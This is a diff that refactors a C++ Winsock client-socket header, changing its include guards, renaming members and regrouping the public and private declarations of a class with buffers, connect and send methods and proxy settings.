@@ -1,16 +1,13 @@
 // ClientSocket.h: interface for the CClientSocket class.
 //
 //////////////////////////////////////////////////////////////////////
+#pragma once
 
-#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
-#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_
 #include <winsock2.h>
 #include <mswsock.h>
-#include "Buffer.h"	// Added by ClassView
+#include "Buffer.h"
 #include "Manager.h"
-#if _MSC_VER > 1000
-#pragma once
-#endif // _MSC_VER > 1000
+
 
 // Change at your Own Peril
 
@@ -75,40 +72,47 @@ struct authans
 class CClientSocket  
 {
 	friend class CManager;
+
+public:
+	CClientSocket();
+	virtual ~CClientSocket();
+
 public:
 	CBuffer m_CompressionBuffer;
 	CBuffer m_DeCompressionBuffer;
 	CBuffer m_WriteBuffer;
 	CBuffer	m_ResendWriteBuffer;
-	void Disconnect();
-	bool Connect(LPCTSTR lpszHost, UINT nPort);
-	int Send(LPBYTE lpData, UINT nSize);
-	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
-	void setManagerCallBack(CManager *pManager);
-	void setGlobalProxyOption(int nProxyType = PROXY_NONE, LPCTSTR	lpszProxyHost = NULL, UINT nProxyPort = 1080, LPCTSTR lpszUserName = NULL, LPCSTR lpszPassWord = NULL);
-	void run_event_loop();
-	bool IsRunning();
 
-	HANDLE m_hWorkerThread;
+	HANDLE m_hRecvWorkerThread;
 	SOCKET m_Socket;
 	HANDLE m_hEvent;
 
-	CClientSocket();
-	virtual ~CClientSocket();
-private:
-	static	int		m_nProxyType;
-	static	char	m_strProxyHost[256];
-	static	UINT	m_nProxyPort;
-	static	char	m_strUserName[256];
-	static	char	m_strPassWord[256];
+	bool Connect(LPCTSTR lpszHost, UINT nPort);
+	void Disconnect();
 
-	BYTE	m_bPacketFlag[FLAG_SIZE];
-	bool ConnectProxyServer(LPCTSTR lpszHost, UINT nPort);
-	static DWORD WINAPI WorkThread(LPVOID lparam);
-	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
+	int Send(LPBYTE lpData, UINT nSize);
+	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
+	void setManagerCallBack(CManager *pManager);
+	
+	void setGlobalProxyOption(int nProxyType = PROXY_NONE, LPCTSTR	lpszProxyHost = NULL, UINT nProxyPort = 1080, LPCTSTR lpszUserName = NULL, LPCSTR lpszPassWord = NULL);
+	
+	void run_event_loop();
+	bool IsRunning();
+
+private:
 	bool m_bIsRunning;
 	CManager	*m_pManager;
+	BYTE m_byPacketFlag[FLAG_SIZE];
 
+	static int  m_nProxyType;
+	static char m_strProxyHost[256];
+	static UINT m_nProxyPort;
+	static char m_strUserName[256];
+	static char m_strPassWord[256];
+
+private:
+	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
+
+	bool ConnectProxyServer(LPCTSTR lpszHost, UINT nPort);
+	static DWORD WINAPI WorkThread(LPVOID lparam);
 };
-
-#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
